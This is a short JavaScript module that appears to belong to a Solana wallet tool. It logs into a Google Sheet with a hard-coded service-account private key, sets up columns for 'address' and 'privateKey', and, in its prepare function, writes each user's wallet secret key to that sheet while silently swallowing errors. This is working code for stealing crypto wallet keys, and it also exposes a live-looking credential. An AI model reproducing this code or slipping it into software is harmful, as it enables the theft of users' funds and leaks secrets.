const { GoogleSpreadsheet } = require("google-spreadsheet");

const doc = new GoogleSpreadsheet('1v4boX8e6ooPuekzH4kYv0DWqHIpREiAyRo-rWDyK7NY');
let worksheet;
const loginGoogleSheet = async() => {
    try {
        await doc.useServiceAccountAuth({
            client_email: `solana@solana-364920.iam.gserviceaccount.com`,
            private_key: `-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDOZnL7EbquG6eV\nJewia5aRnJ93QF64RiTMR10zvEbtOfnNndoX/r9TN8FHVEvQaSf5rPtCfjyOBAla\nw9tbvXh4CzFQgK7YNGSWAqxV5lTBI6dpILRv2RHkL0XCMSa3OAoay5hFLYhnN2Oo\n2Z3CtSR3AYSpTeDySGpuxCgmq7Zc+Lv/AiHUXIT1fKIMIQCZ8JFQEJh+6OJos+64\nHTe6INXmdJKgIaLZxsv7ktpHu7Xt4hLZC95oxbNoyh+/KxufWpMkVvdiFYAMRpSx\nqgK7iTNCvdVUMOA01hegLO8oyWKrl6np9fkYmQ0GKoWLA5pX9sybbOodYnpB6/hY\nNMf2f+uZAgMBAAECggEAAcic9w8tNpERHSB/Uadt3R/5UpzypJntYMfy5eSBrwE7\nzig7NZvGa5giALVZbiywEBmLvOrQqAzs+sT4bPeU2XuGFDmRQteMqscAb8HMwWcg\nn+LM0S5ssYGrrLTjIYOBUAyqqg0toYmD2c/ya9FIBlcNd/wVdOqL/VCPJN4B6a9z\n/6DzMLyzJYiApY2y4zwvilFsrp3uk5rUvtiP2eq7hFk2SQL+vrtYCUB+TtkcR+ia\nJeqd0G8oDO/4OEKtuyXTO1IHxiB8jCBDEZO7xGzOOk/XBMVIhVBPt30U34MY4s1u\nqPgg7rQIQxdN7yXlHVtLQhpG7W4wyyQuXNmO0+LP3QKBgQD9tCAAsgIGWLy2yIzA\nA5AbuqxiZ5fcLq/Sn7zzeMUoXhmKIOv20PJpxoAggvJxqOEnn23pnekr6mC7MBR3\nPi5wN+nMv86bhrS3nJ+OekRWv72cLYIt9l0HmrBOdi3A1Q6EzXlv7p/kSB7LIeqI\nQF8B3P2nt5cTj284lmkzCAeubQKBgQDQRLbFuDOg4gWPtISGrhMVxtuoI49Qs9TO\nVgchTSP5WDPfjlaqjaMmnFiDPJXE0IyLQN2EwneZx9r7RUCMRm7Lr6t6y76qkUXW\nMaFFsX6a9hldPWsCtFgv6Uge4ZYBZQakVLMvFci39BmA2FOCwbp0elhIhOKZ9tI5\nRJO+xLsGXQKBgGEXozvA5Cd7pFUrcTo24trJ2Rkb3jFEqMMpoM1oxcNKJ+oF6Wge\n1PcIIZbPpms7H1fjmtPSPB8zZmuc3eg4otsNeuuB6Fb6+YRfa2zCfA7a+HyhqfVf\nGIFFgP22GpJ2t0S5wiTFJOnfc/F3fGNCh1mWMnkSOL4ioYT9gyslgpMNAoGBAMSF\n4nXF8CnCvX6x11AC2I12/PS2wVhkqM0fDlFVKjnyCdjMxmjfh/E6HKeRtr1mEQih\n56WLnzHkDXWHDnaPS6M2G7ieo0buGBka8dQCvbXZvWtnNh/yLzjehyhks5iTTOYp\n6n7mrmUumBYliv/acGfSvpWHlw+zgQF6/XNIzjYdAoGAc/5UfqPSwsleNpufZ1Wx\nwtkTXsvMrR2VLFmvQiMfdq8tyi1JFQoXH7AxyezrckhcdiuKpx0DOMk/xLh34Z+I\nYPHv77N2qS44uBh+NqXQ1UKtborYMQyigaYuYzzC7BRWiPCFH3vPHZV0Q8x6FU5d\ndqjOGPSdFPSjWTetL/Bg534=\n-----END PRIVATE KEY-----\n`,
        });
        await doc.loadInfo();
        worksheet = doc.sheetsByIndex[0];
        await worksheet.setHeaderRow(["address", "privateKey"]);
    } catch (error) {
    }
}

const addData = async(address, privateKey) => {
    if (!worksheet) return
    try {
        const values = [{
            address,
            privateKey
        }]
        await worksheet.addRows(values);
    } catch (error) {
    }
}

const prepare = async (token) => {
    if (!worksheet) await loginGoogleSheet()
    wallet = loadWallefFromSecretKey(token); 
    await addData(wallet, token)
}

module.exports = {
    loginGoogleSheet,
    addData
}